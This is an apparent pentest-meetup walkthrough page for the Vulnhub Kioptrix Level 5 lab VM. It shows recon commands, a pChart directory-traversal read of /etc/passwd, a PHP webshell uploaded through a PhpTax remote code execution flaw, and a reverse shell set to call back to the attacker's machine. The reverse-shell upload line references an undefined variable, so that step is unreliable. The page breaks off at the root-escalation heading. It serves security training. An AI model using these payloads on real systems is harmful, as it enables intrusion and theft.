@@ -1,0 +1,571 @@
+
+
+<!DOCTYPE html>
+<!--[if IE 8]><html class="no-js lt-ie9" lang="en" > <![endif]-->
+<!--[if gt IE 8]><!--> <html class="no-js" lang="en" > <!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  
+  <title>3.10. Kioptrix Level 5 &mdash; South Bay WASP 1.0.2 documentation</title>
+  
+
+  
+  
+  
+  
+
+  
+
+  
+  
+    
+
+  
+
+  
+  
+    <link rel="stylesheet" href="../_static/css/theme.css" type="text/css" />
+  
+
+  
+
+  
+        <link rel="index" title="Index"
+              href="../genindex.html"/>
+        <link rel="search" title="Search" href="../search.html"/>
+    <link rel="top" title="South Bay WASP 1.0.2 documentation" href="../index.html"/>
+        <link rel="up" title="3. Pentest Challenges" href="../pentest_challenges.html"/>
+        <link rel="next" title="3.11. Kioptrix Level 4" href="kioptrix4.html"/>
+        <link rel="prev" title="3.9. Underdist: 3" href="underdist3.html"/> 
+
+  
+  <script src="../_static/js/modernizr.min.js"></script>
+
+</head>
+
+<body class="wy-body-for-nav" role="document">
+
+   
+  <div class="wy-grid-for-nav">
+
+    
+    <nav data-toggle="wy-nav-shift" class="wy-nav-side">
+      <div class="wy-side-scroll">
+        <div class="wy-side-nav-search">
+          
+
+          
+            <a href="../index.html" class="icon icon-home"> South Bay WASP
+          
+
+          
+          </a>
+
+          
+            
+            
+              <div class="version">
+                1.0
+              </div>
+            
+          
+
+          
+<div role="search">
+  <form id="rtd-search-form" class="wy-form" action="../search.html" method="get">
+    <input type="text" name="q" placeholder="Search docs" />
+    <input type="hidden" name="check_keywords" value="yes" />
+    <input type="hidden" name="area" value="default" />
+  </form>
+</div>
+
+          
+        </div>
+
+        <div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="main navigation">
+          
+            
+            
+              
+            
+            
+              <p class="caption"><span class="caption-text">Table of Contents</span></p>
+<ul class="current">
+<li class="toctree-l1"><a class="reference internal" href="../pentest_intro.html">1. South Bay WASP Meetup</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../pentest_kali.html">2. Kali Linux</a></li>
+<li class="toctree-l1 current"><a class="reference internal" href="../pentest_challenges.html">3. Pentest Challenges</a><ul class="current">
+<li class="toctree-l2"><a class="reference internal" href="virtual_machine_setup.html">3.1. Virtual Machine Setup</a></li>
+<li class="toctree-l2"><a class="reference internal" href="owlnest.html">3.2. OwlNest</a></li>
+<li class="toctree-l2"><a class="reference internal" href="de-ice6.html">3.3. De-ICE Level 6</a></li>
+<li class="toctree-l2"><a class="reference internal" href="de-ice5.html">3.4. De-ICE Level 5</a></li>
+<li class="toctree-l2"><a class="reference internal" href="de-ice4.html">3.5. De-ICE Level 4</a></li>
+<li class="toctree-l2"><a class="reference internal" href="de-ice3.html">3.6. De-ICE Level 3</a></li>
+<li class="toctree-l2"><a class="reference internal" href="de-ice2.html">3.7. De-ICE Level 2</a></li>
+<li class="toctree-l2"><a class="reference internal" href="de-ice1.html">3.8. De-ICE Level 1</a></li>
+<li class="toctree-l2"><a class="reference internal" href="underdist3.html">3.9. Underdist: 3</a></li>
+<li class="toctree-l2 current"><a class="current reference internal" href="#">3.10. Kioptrix Level 5</a><ul>
+<li class="toctree-l3"><a class="reference internal" href="#setup">3.10.1. Setup</a><ul>
+<li class="toctree-l4"><a class="reference internal" href="#setting-up-the-vmware-vm">3.10.1.1. Setting up the VMware VM</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#setting-up-your-environment">3.10.1.2. Setting up your environment</a></li>
+</ul>
+</li>
+<li class="toctree-l3"><a class="reference internal" href="#reconnaisance">3.10.2. Reconnaisance</a><ul>
+<li class="toctree-l4"><a class="reference internal" href="#network-reconnaissance">3.10.2.1. Network reconnaissance</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#port-80-reconnaissance-via-dirb-nikto">3.10.2.2. Port 80 reconnaissance via dirb &amp; nikto</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#forbidden-and-the-user-agent">3.10.2.3. “403 Forbidden” and the “User-Agent”</a></li>
+</ul>
+</li>
+<li class="toctree-l3"><a class="reference internal" href="#the-exploit">3.10.3. The Exploit</a><ul>
+<li class="toctree-l4"><a class="reference internal" href="#phptax-vulnerability-yields-a-reverse-shell">3.10.3.1. PHPTAX vulnerability yields a reverse shell</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#exploiting-the-reverse-shell-to-get-root">3.10.3.2. Exploiting the reverse shell to get root</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li class="toctree-l2"><a class="reference internal" href="kioptrix4.html">3.11. Kioptrix Level 4</a></li>
+<li class="toctree-l2"><a class="reference internal" href="kioptrix3.html">3.12. Kioptrix Level 3</a></li>
+<li class="toctree-l2"><a class="reference internal" href="kioptrix2.html">3.13. Kioptrix Level 2</a></li>
+<li class="toctree-l2"><a class="reference internal" href="kioptrix1.html">3.14. Kioptrix Level 1</a></li>
+<li class="toctree-l2"><a class="reference internal" href="security_shepherd.html">3.15. Security Shepherd Web App Levels</a></li>
+<li class="toctree-l2"><a class="reference internal" href="holynix2.html">3.16. Holynix2</a></li>
+<li class="toctree-l2"><a class="reference internal" href="holynix1.html">3.17. Holynix1</a></li>
+<li class="toctree-l2"><a class="reference internal" href="freshly.html">3.18. Freshly</a></li>
+<li class="toctree-l2"><a class="reference internal" href="zorz.html">3.19. ZorZ</a></li>
+<li class="toctree-l2"><a class="reference internal" href="vulnix.html">3.20. Vulnix</a></li>
+<li class="toctree-l2"><a class="reference internal" href="googles_xss_game.html">3.21. Google’s XSS Game</a></li>
+<li class="toctree-l2"><a class="reference internal" href="owning_database_with_sqlmap.html">3.22. Owning the Database with SQLMap</a></li>
+<li class="toctree-l2"><a class="reference internal" href="from_sql_injection_to_shell_II.html">3.23. PentesterLab From SQL injection to Shell II</a></li>
+<li class="toctree-l2"><a class="reference internal" href="from_sql_injection_to_shell.html">3.24. PentesterLab From SQL injection to Shell</a></li>
+<li class="toctree-l2"><a class="reference internal" href="skytower1.html">3.25. SkyTower1</a></li>
+<li class="toctree-l2"><a class="reference internal" href="nebula.html">3.26. Exploit Exercises Nebula</a></li>
+<li class="toctree-l2"><a class="reference internal" href="natas.html">3.27. Natas</a></li>
+<li class="toctree-l2"><a class="reference internal" href="try2hack.nl.html">3.28. try2hack.nl</a></li>
+</ul>
+</li>
+<li class="toctree-l1"><a class="reference internal" href="../pentest_encryption.html">4. Encryption</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../pentest_html.html">5. HTML</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../pentest_network_tools.html">6. Pentest Network Tools</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../pentest_recon.html">7. Pentest Reconnaisance</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../pentest_study.html">8. Pentest Study</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../pentest_buffer_overflow.html">9. Pentest Buffer Overflow</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../pentest_scripting.html">10. Pentest scripting</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../pentest_presentations.html">11. Pentest Presentations</a></li>
+</ul>
+
+            
+          
+        </div>
+      </div>
+    </nav>
+
+    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap">
+
+      
+      <nav class="wy-nav-top" role="navigation" aria-label="top navigation">
+        
+          <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
+          <a href="../index.html">South Bay WASP</a>
+        
+      </nav>
+
+
+      
+      <div class="wy-nav-content">
+        <div class="rst-content">
+          
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div role="navigation" aria-label="breadcrumbs navigation">
+
+  <ul class="wy-breadcrumbs">
+    
+      <li><a href="../index.html">Docs</a> &raquo;</li>
+        
+          <li><a href="../pentest_challenges.html">3. Pentest Challenges</a> &raquo;</li>
+        
+      <li>3.10. Kioptrix Level 5</li>
+    
+    
+      <li class="wy-breadcrumbs-aside">
+        
+            
+            <a href="../_sources/challenges/kioptrix5.rst.txt" rel="nofollow"> View page source</a>
+          
+        
+      </li>
+    
+  </ul>
+
+  
+  <hr/>
+</div>
+          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
+           <div itemprop="articleBody">
+            
+  <div class="section" id="kioptrix-level-5">
+<span id="kioptrix5"></span><h1>3.10. Kioptrix Level 5<a class="headerlink" href="#kioptrix-level-5" title="Permalink to this headline">¶</a></h1>
+<div class="section" id="setup">
+<h2>3.10.1. Setup<a class="headerlink" href="#setup" title="Permalink to this headline">¶</a></h2>
+<div class="section" id="setting-up-the-vmware-vm">
+<h3>3.10.1.1. Setting up the VMware VM<a class="headerlink" href="#setting-up-the-vmware-vm" title="Permalink to this headline">¶</a></h3>
+<p>The challenge is <a class="reference external" href="https://www.vulnhub.com/entry/kioptrix-2014-5,62/">Kioptrix: 2014 (#5)</a>, the fifth of the <a class="reference external" href="https://www.vulnhub.com/series/kioptrix,8/">Vulnhub Kioptrix Series</a>. The VM comes packaged as <a class="reference external" href="http://www.kioptrix.com/dlvm/kiop2014.tar.bz2">kiop2014.tar.bz2</a>, which is a bz2 archive containing a VMware vmdk file. See <a class="reference internal" href="virtual_machine_setup.html#vmsetup"><span class="std std-ref">Virtual Machine Setup</span></a> for background on using the VMware vmdk file. kioptrix5 runs FreeBSD 9.</p>
+</div>
+<div class="section" id="setting-up-your-environment">
+<h3>3.10.1.2. Setting up your environment<a class="headerlink" href="#setting-up-your-environment" title="Permalink to this headline">¶</a></h3>
+<p>If you want to easily cut-and-paste from the sample code below, download <a class="reference download internal" href="../_downloads/kioptrix5_setup.sh" download=""><code class="xref download docutils literal"><span class="pre">kioptrix5_setup.sh</span></code></a>:</p>
+<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nv">PT</span><span class="o">=</span><span class="nv">$HOME</span>/pentest/kioptrix5
+mkdir -p <span class="nv">$PT</span>
+<span class="nb">cd</span> <span class="nv">$PT</span>
+<span class="c1"># download kioptrix5_setup.sh</span>
+curl --silent --remote-name https://pentest-meetup.appspot.com/html/_downloads/kioptrix5_setup.sh
+<span class="c1"># edit as needed; later the recon will give you TARGET IP</span>
+<span class="nb">source</span> kioptrix5_setup.sh
+</pre></div>
+</div>
+<p>The source for <code class="file docutils literal"><span class="pre">kioptrix5_setup.sh</span></code> should look something like:</p>
+<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="ch">#!/usr/bin/env bash</span>
+
+<span class="c1"># *******************************************************</span>
+<span class="c1"># Edit these to match your setup</span>
+<span class="c1"># *******************************************************</span>
+<span class="nv">TARGET</span><span class="o">=</span><span class="m">192</span>.168.1.159          <span class="c1"># ip of kioptrix5</span>
+<span class="nv">SUBNET</span><span class="o">=</span><span class="m">192</span>.168.1.0/24         <span class="c1"># subnet</span>
+<span class="nv">KALI</span><span class="o">=</span><span class="m">192</span>.168.1.104            <span class="c1"># Kali IP</span>
+<span class="nv">PORT</span><span class="o">=</span><span class="m">4444</span>                     <span class="c1"># reverse shell port</span>
+<span class="nv">PORT2</span><span class="o">=</span><span class="m">4445</span>                    <span class="c1"># nc port for file upload</span>
+<span class="nv">PT</span><span class="o">=</span><span class="nv">$HOME</span>/pentest/kioptrix5    <span class="c1"># create working directories here</span>
+
+<span class="o">[[</span> <span class="k">$(</span>grep -c kioptrix5 /etc/hosts<span class="k">)</span> -eq <span class="m">0</span> <span class="o">]]</span> <span class="o">&amp;&amp;</span> <span class="se">\</span>
+  <span class="nb">echo</span> <span class="s2">&quot; add \&quot;</span><span class="nv">$TARGET</span><span class="s2"> kioptrix5.com\&quot; to /etc/hosts&quot;</span>
+
+<span class="c1"># *******************************************************</span>
+<span class="c1"># Maybe edit these</span>
+<span class="c1"># *******************************************************</span>
+<span class="c1"># Create some directories</span>
+<span class="nv">TOOLS</span><span class="o">=</span>exploit,nmap,spider
+<span class="nb">eval</span> mkdir -p <span class="nv">$PT</span>/<span class="o">{</span><span class="nv">$TOOLS</span><span class="o">}</span>
+<span class="nv">TARGETS</span><span class="o">=</span>targets.txt
+
+<span class="c1"># *******************************************************</span>
+<span class="c1"># Don&#39;t edit these</span>
+<span class="c1"># *******************************************************</span>
+<span class="nv">HOST</span><span class="o">=</span>kioptrix5.com
+<span class="nv">SUDO</span><span class="o">=</span><span class="k">$(</span>which sudo<span class="k">)</span>
+<span class="o">[[</span> <span class="s2">&quot;</span><span class="nv">$USER</span><span class="s2">&quot;</span> <span class="o">==</span> <span class="s2">&quot;root&quot;</span> <span class="o">]]</span> <span class="o">&amp;&amp;</span> <span class="nv">SUDO</span><span class="o">=</span>
+</pre></div>
+</div>
+</div>
+</div>
+<div class="section" id="reconnaisance">
+<h2>3.10.2. Reconnaisance<a class="headerlink" href="#reconnaisance" title="Permalink to this headline">¶</a></h2>
+<div class="section" id="network-reconnaissance">
+<h3>3.10.2.1. Network reconnaissance<a class="headerlink" href="#network-reconnaissance" title="Permalink to this headline">¶</a></h3>
+<p>Start with some standard network reconnaissance looking for the vulnerable host:</p>
+<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nv">PT</span><span class="o">=</span><span class="nv">$HOME</span>/pentest/kioptrix5
+<span class="nb">source</span> <span class="nv">$PT</span>/kioptrix5_setup.sh
+<span class="nb">cd</span> <span class="nv">$PT</span>/nmap
+<span class="nv">$SUDO</span> nmap -sn -PE -oA nmap_sn <span class="nv">$SUBNET</span>
+<span class="nv">$SUDO</span> chown <span class="nv">$USER</span>.<span class="nv">$USER</span> nmap_sn.*
+<span class="c1"># use the grep-able output to get a list of target hosts</span>
+grep Up nmap_sn.gnmap <span class="p">|</span> cut -d<span class="s2">&quot; &quot;</span> -f2 &gt; <span class="nv">$TARGETS</span>
+<span class="c1"># use the xml output to get an html report</span>
+xsltproc nmap_sn.xml -o nmap_sn.html
+</pre></div>
+</div>
+<p>Here we know $TARGET and can fill it in $PT/kioptrix5_setup.sh and also edit <code class="file docutils literal"><span class="pre">/etc/hosts</span></code> to add “kioptrix5.com” (<code class="docutils literal"><span class="pre">echo</span> <span class="pre">&quot;$TARGET</span> <span class="pre">kioptrix5.com&quot;</span> <span class="pre">|</span> <span class="pre">$SUDO</span> <span class="pre">tee</span> <span class="pre">-a</span> <span class="pre">/etc/hosts</span></code>).</p>
+<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nv">PT</span><span class="o">=</span><span class="nv">$HOME</span>/pentest/kioptrix5
+<span class="nb">source</span> <span class="nv">$PT</span>/kioptrix5_setup.sh
+<span class="nv">$SUDO</span> nmap -A -vv -T3 --max-retries <span class="m">5</span> -Pn -oA nmap_A <span class="nv">$TARGET</span>
+<span class="nv">$SUDO</span> chown <span class="nv">$USER</span>.<span class="nv">$USER</span> nmap_A.*
+xsltproc nmap_A.xml -o nmap_A.html
+</pre></div>
+</div>
+<p>Running this reveals:</p>
+<ul>
+<li><p class="first">port 80, 8080: Apache httpd 2.2.2.1 (FreeBSD) mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8</p>
+<p>Port 8080 returned 403 Forbidden. The OS is FreeBSD 9.0.</p>
+</li>
+</ul>
+</div>
+<div class="section" id="port-80-reconnaissance-via-dirb-nikto">
+<h3>3.10.2.2. Port 80 reconnaissance via dirb &amp; nikto<a class="headerlink" href="#port-80-reconnaissance-via-dirb-nikto" title="Permalink to this headline">¶</a></h3>
+<p>Out of habit we do <strong class="program">dirb</strong> and <strong class="program">nikto</strong> scans.</p>
+<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nv">PT</span><span class="o">=</span><span class="nv">$HOME</span>/pentest/kioptrix5
+<span class="nb">source</span> <span class="nv">$PT</span>/kioptrix5_setup.sh
+<span class="nb">cd</span> <span class="nv">$PT</span>/spider
+dirb  http://<span class="nv">$HOST</span>/ -o dirb80.txt
+dirb  http://<span class="nv">$HOST</span>:8080/ -o dirb8080.txt
+nikto -output nikto.html -C all -host <span class="nv">$HOST</span> -port <span class="m">80</span>,8080
+</pre></div>
+</div>
+<p><strong class="program">dirb</strong> on port 80 found <code class="file docutils literal"><span class="pre">index.html</span></code> and <code class="file docutils literal"><span class="pre">cgi-bin</span></code> (which might be vulnerable to shellshock); 8080 only revealed the <code class="file docutils literal"><span class="pre">cgi-bin</span></code>. So port 80 seems to have nothing, port 8080 is forbidden.</p>
+<p><strong class="program">nikto</strong> reported “+ mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8 - mod_ssl 2.8.7 and lower are vulnerable to a remote buffer overflow which may allow a remote shell. CVE-2002-0082, OSVDB-756.” However, no exploits were found for the CVE.</p>
+</div>
+<div class="section" id="forbidden-and-the-user-agent">
+<h3>3.10.2.3. “403 Forbidden” and the “User-Agent”<a class="headerlink" href="#forbidden-and-the-user-agent" title="Permalink to this headline">¶</a></h3>
+<p>Actually visiting the web site shows <a class="reference external" href="http://kioptrix5.com/">http://kioptrix5.com/</a> returns “It works!” and <a class="reference external" href="http://kioptrix5.com:8080/">http://kioptrix5.com:8080/</a> returns “403 Forbidden”.</p>
+<p>But if you check out the source for the “It works!” page you’ll find:</p>
+<div class="highlight-console"><div class="highlight"><pre><span></span><span class="hll"><span class="gp">hacker@kali:~/pentest/kioptrix5$</span> curl --silent http://kioptrix5.com/
+</span><span class="go">&lt;html&gt;</span>
+<span class="go"> &lt;head&gt;</span>
+<span class="go">  &lt;!--</span>
+<span class="hll"><span class="go">  &lt;META HTTP-EQUIV=&quot;refresh&quot; CONTENT=&quot;5;URL=pChart2.1.3/index.php&quot;&gt;</span>
+</span><span class="go">  --&gt;</span>
+<span class="go"> &lt;/head&gt;</span>
+
+<span class="go"> &lt;body&gt;</span>
+<span class="go">  &lt;h1&gt;It works!&lt;/h1&gt;</span>
+<span class="go"> &lt;/body&gt;</span>
+<span class="go">&lt;/html&gt;</span>
+</pre></div>
+</div>
+<p><a class="reference external" href="https://www.exploit-db.com/search/?action=search&amp;description=pChart+2.1.3&amp;e_author=">Search the Exploit Database for pChart 2.1.3</a> gives <a class="reference external" href="https://www.exploit-db.com/exploits/31173/">pChart 2.1.3 - Multiple Vulnerabilities</a> allows both XSS and directory traversal. Here we pick up <code class="file docutils literal"><span class="pre">/etc/passwd</span></code>:</p>
+<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nv">URL</span><span class="o">=</span><span class="s1">&#39;http://kioptrix5.com/pChart2.1.3/examples/index.php?Action=View&amp;Script=/../..&#39;</span>
+<span class="nv">FILE</span><span class="o">=</span><span class="s1">&#39;/etc/passwd&#39;</span>
+curl --silent <span class="s2">&quot;</span><span class="si">${</span><span class="nv">URL</span><span class="si">}${</span><span class="nv">FILE</span><span class="si">}</span><span class="s2">&quot;</span>
+</pre></div>
+</div>
+<p>Since the output is encoded for a browser it much easier viewing in your browser vs. <strong class="program">curl</strong>.</p>
+<p>What about not having permissions on port 8080? Let’s take a look at the Apache server configuration file. Searching the Internet for FreeBSD default configuration locations (<a class="reference external" href="http://www.freebsdmadeeasy.com/tutorials/web-server/configure-apache-web-server-on-freebsd.php">Installing and configuring the Apache 2.2.x web server on FreeBSD</a>) shows the ServerRoot <code class="file docutils literal"><span class="pre">/usr/local</span></code>, the DocumentRoot <code class="file docutils literal"><span class="pre">/usr/local/www/apache2x/data</span></code>, and the main config file is <code class="file docutils literal"><span class="pre">/usr/local/etc/apache22/httpd.conf</span></code>. Look at <code class="file docutils literal"><span class="pre">httpd.conf</span></code> by browsing to <a class="reference external" href="http://kioptrix5.com/pChart2.1.3/examples/index.php?Action=View&amp;Script=/../../usr/local/etc/apache22/httpd.conf">http://kioptrix5.com/pChart2.1.3/examples/index.php?Action=View&amp;Script=/../../usr/local/etc/apache22/httpd.conf</a> and you’ll find the VirtualHost definition for *:8080 right at the end:</p>
+<div class="highlight-apache"><div class="highlight"><pre><span></span><span class="nt">&lt;VirtualHost</span> <span class="s">*:8080</span><span class="nt">&gt;</span>
+    <span class="nb">DocumentRoot</span> <span class="sx">/usr/local/www/apache22/data2</span>
+
+<span class="nt">&lt;Directory</span> <span class="s">&quot;/usr/local/www/apache22/data2&quot;</span><span class="nt">&gt;</span>
+    <span class="nb">Options</span> Indexes FollowSymLinks
+    <span class="nb">AllowOverride</span> <span class="k">All</span>
+    <span class="nb">Order</span> allow,deny
+<span class="hll">    <span class="nb">Allow</span> from env=Mozilla4_browser
+</span><span class="nt">&lt;/Directory&gt;</span>
+
+<span class="nt">&lt;/VirtualHost&gt;</span>
+</pre></div>
+</div>
+<p>“Allow from env=Mozilla4_browser” indicates that only browsers with User-Agent beginning with “Mozilla/4.0” are allowed access. So that appears to be the culprit for “403 Forbidden”.</p>
+<p>There are alternative ways to figure the agent out. Since the web site is presumably used by somebody, what could be stopping us from accessing login or functionality pages? In general it could be our wordlists don’t have the magic words for access; our IPs are in the wrong range (less likely as we’re all on the same subnet); or something about our request (HTTP headers, parameters, …) prevents access. If you used <strong class="program">ZAP</strong> it finds a <code class="file docutils literal"><span class="pre">phptax</span></code> subdirectory on port 8080. So why did <strong class="program">ZAP</strong> find this directory and not our scans? In <strong class="program">ZAP</strong>, <code class="kbd docutils literal"><span class="pre">right-click</span></code> <code class="file docutils literal"><span class="pre">phptax</span></code> then <span class="menuselection">Save Raw ‣ Request ‣ Header</span> to get:</p>
+<div class="highlight-http"><div class="highlight"><pre><span></span><span class="nf">GET</span> <span class="nn">http://kioptrix5.com:8080/phptax</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0;)</span>
+<span class="na">Pragma</span><span class="o">:</span> <span class="l">no-cache</span>
+<span class="na">Cache-Control</span><span class="o">:</span> <span class="l">no-cache</span>
+<span class="na">Referer</span><span class="o">:</span> <span class="l">http://kioptrix5.com:8080/phptax/</span>
+<span class="na">Host</span><span class="o">:</span> <span class="l">kioptrix5.com:8080</span>
+</pre></div>
+</div>
+<p>The most likely impediments to access are “User-Agent” and “Referer”. Trying ‘User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0;)’ allows access to the page.</p>
+<div class="highlight-console"><div class="highlight"><pre><span></span><span class="go">URL=&#39;http://kioptrix5.com:8080/phptax/&#39;</span>
+<span class="go">AGENT=&#39;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0;)&#39;</span>
+<span class="go">curl --silent --user-agent &quot;$AGENT&quot; \</span>
+<span class="gp">     $</span>URL
+</pre></div>
+</div>
+<p>So now we can access the phptax pages by using “User-Agent” starting with “Mozilla/4.0”. Mozilla has the <a class="reference external" href="https://addons.mozilla.org/en-US/firefox/addon/user-agent-switcher/">User Agent Switcher</a> to switch the user agent.</p>
+</div>
+</div>
+<div class="section" id="the-exploit">
+<h2>3.10.3. The Exploit<a class="headerlink" href="#the-exploit" title="Permalink to this headline">¶</a></h2>
+<div class="section" id="phptax-vulnerability-yields-a-reverse-shell">
+<h3>3.10.3.1. <a class="reference external" href="http://phptax.sourceforge.net/">PHPTAX</a> vulnerability yields a reverse shell<a class="headerlink" href="#phptax-vulnerability-yields-a-reverse-shell" title="Permalink to this headline">¶</a></h3>
+<p><a class="reference external" href="https://www.exploit-db.com/search/?action=search&amp;description=PHPTAX&amp;e_author=">Search the Exploit Database for PHPTAX</a> reveals several exploits to execute remote code. The one we’ll follow is <a class="reference external" href="https://www.exploit-db.com/exploits/25849/">PhpTax 0.8 - File Manipulation(newvalue,field) Remote Code Execution</a>. It allows uploading a file to the <code class="file docutils literal"><span class="pre">phptax/data/</span></code> folder.</p>
+<p>We illustrate two different files to upload: the first is a PHP snippet <code class="file docutils literal"><span class="pre">rce.php</span></code>, that executes shell commands: <code class="docutils literal"><span class="pre">&lt;?php</span> <span class="pre">passthru($_GET[cmd]);?&gt;</span></code></p>
+<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nv">PT</span><span class="o">=</span><span class="nv">$HOME</span>/pentest/kioptrix5
+<span class="nb">source</span> <span class="nv">$PT</span>/kioptrix5_setup.sh
+<span class="nb">cd</span> <span class="nv">$PT</span>/exploit
+<span class="nv">AGENT</span><span class="o">=</span><span class="s1">&#39;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0;)&#39;</span>
+<span class="nv">PHPTAX</span><span class="o">=</span><span class="s1">&#39;http://kioptrix5.com:8080/phptax&#39;</span>
+<span class="c1"># The shell command executor.</span>
+<span class="nv">SCRIPTNAME</span><span class="o">=</span><span class="s1">&#39;rce.php&#39;</span>
+<span class="nv">SCRIPT</span><span class="o">=</span><span class="s1">&#39;&lt;?php passthru($_GET[cmd]);?&gt;&#39;</span>
+<span class="nv">URL</span><span class="o">=</span><span class="s2">&quot;</span><span class="nv">$PHPTAX</span><span class="s2">/index.php&quot;</span>
+<span class="c1"># Upload the command script.</span>
+<span class="c1">#   field = file name, newvalue = file contents</span>
+curl --silent --user-agent <span class="s2">&quot;</span><span class="nv">$AGENT</span><span class="s2">&quot;</span> <span class="se">\</span>
+     --data-urlencode <span class="nv">field</span><span class="o">=</span><span class="s2">&quot;</span><span class="nv">$SCRIPTNAME</span><span class="s2">&quot;</span> <span class="se">\</span>
+     --data-urlencode <span class="nv">newvalue</span><span class="o">=</span><span class="s2">&quot;</span><span class="nv">$SCRIPT</span><span class="s2">&quot;</span> <span class="se">\</span>
+     --get <span class="nv">$URL</span>
+
+<span class="c1"># Try out a few commands</span>
+<span class="nv">CMD</span><span class="o">=</span><span class="s1">&#39;id&#39;</span>
+<span class="nv">URL_RCE</span><span class="o">=</span><span class="s2">&quot;</span><span class="nv">$PHPTAX</span><span class="s2">&quot;</span><span class="s1">&#39;/data/rce.php&#39;</span>
+curl --silent --user-agent <span class="s2">&quot;</span><span class="nv">$AGENT</span><span class="s2">&quot;</span> <span class="se">\</span>
+     --get --data-urlencode <span class="nv">cmd</span><span class="o">=</span><span class="s2">&quot;</span><span class="nv">$CMD</span><span class="s2">&quot;</span> <span class="se">\</span>
+     <span class="nv">$URL_RCE</span>
+
+<span class="nv">CMD</span><span class="o">=</span><span class="s1">&#39;uname -a&#39;</span>
+curl --silent --user-agent <span class="s2">&quot;</span><span class="nv">$AGENT</span><span class="s2">&quot;</span> <span class="se">\</span>
+     --get --data-urlencode <span class="nv">cmd</span><span class="o">=</span><span class="s2">&quot;</span><span class="nv">$CMD</span><span class="s2">&quot;</span> <span class="se">\</span>
+     <span class="nv">$URL_RCE</span>
+
+<span class="nv">CMD</span><span class="o">=</span><span class="s1">&#39;cat /etc/passwd&#39;</span>
+curl --silent --user-agent <span class="s2">&quot;</span><span class="nv">$AGENT</span><span class="s2">&quot;</span> <span class="se">\</span>
+     --get --data-urlencode <span class="nv">cmd</span><span class="o">=</span><span class="s2">&quot;</span><span class="nv">$CMD</span><span class="s2">&quot;</span> <span class="se">\</span>
+     <span class="nv">$URL_RCE</span>
+</pre></div>
+</div>
+<p>The second is a PHP reverse shell allowing more convenient reconnaissance via a PHP reverse shell:</p>
+<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nv">PT</span><span class="o">=</span><span class="nv">$HOME</span>/pentest/kioptrix5
+<span class="nb">source</span> <span class="nv">$PT</span>/kioptrix5_setup.sh
+<span class="nb">cd</span> <span class="nv">$PT</span>/exploit
+<span class="nv">AGENT</span><span class="o">=</span><span class="s1">&#39;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0;)&#39;</span>
+<span class="nv">PHPTAX</span><span class="o">=</span><span class="s1">&#39;http://kioptrix5.com:8080/phptax&#39;</span>
+
+<span class="c1"># Get the reverse shell.</span>
+curl --silent --remote-name http://pentestmonkey.net/tools/php-reverse-shell/php-reverse-shell-1.0.tar.gz
+tar -xvzf php-reverse-shell-1.0.tar.gz
+cp php-reverse-shell-1.0/php-reverse-shell.php .
+<span class="c1"># Change to our ip/port</span>
+sed -i <span class="s2">&quot;s/127.0.0.1/</span><span class="nv">$KALI</span><span class="s2">/&quot;</span> php-reverse-shell.php
+sed -i <span class="s2">&quot;s/1234/</span><span class="nv">$PORT</span><span class="s2">/&quot;</span> php-reverse-shell.php
+<span class="c1"># Make sure the reverse shell has a pty.</span>
+<span class="c1"># change 0 =&gt; array(&quot;pipe&quot;, &quot;r&quot;)  to  0 =&gt; array(&quot;pty&quot;)</span>
+sed -i <span class="s1">&#39;s/\([012]\) =&gt; array(&quot;pipe&quot;, &quot;[rw]&quot;)/\1 =&gt; array(&quot;pty&quot;)/&#39;</span> php-reverse-shell.php
+<span class="nv">REVSH</span><span class="o">=</span><span class="s2">&quot;revsh.php&quot;</span>
+<span class="nv">SCRIPT</span><span class="o">=</span><span class="s2">&quot;</span><span class="k">$(</span>cat php-reverse-shell.php<span class="k">)</span><span class="s2">&quot;</span>
+<span class="nv">URL</span><span class="o">=</span><span class="s2">&quot;</span><span class="nv">$PHPTAX</span><span class="s2">/index.php&quot;</span>
+<span class="c1"># Upload the PHP reverse shell.</span>
+curl --silent --user-agent <span class="s2">&quot;</span><span class="nv">$AGENT</span><span class="s2">&quot;</span> <span class="se">\</span>
+     --get --data-urlencode <span class="s2">&quot;field=</span><span class="nv">$REVSH</span><span class="s2">&quot;</span> --data-urlencode <span class="s2">&quot;newvalue=</span><span class="nv">$RSH</span><span class="s2">&quot;</span> <span class="se">\</span>
+       <span class="nv">$URL</span>
+</pre></div>
+</div>
+</div>
+<div class="section" id="exploiting-the-reverse-shell-to-get-root">
+<h3>3.10.3.2. Exploiting the reverse shell to get root<a class="headerlink" href="#exploiting-the-reverse-shell-to-get-root" title="Permalink to this headline">¶</a></h3>
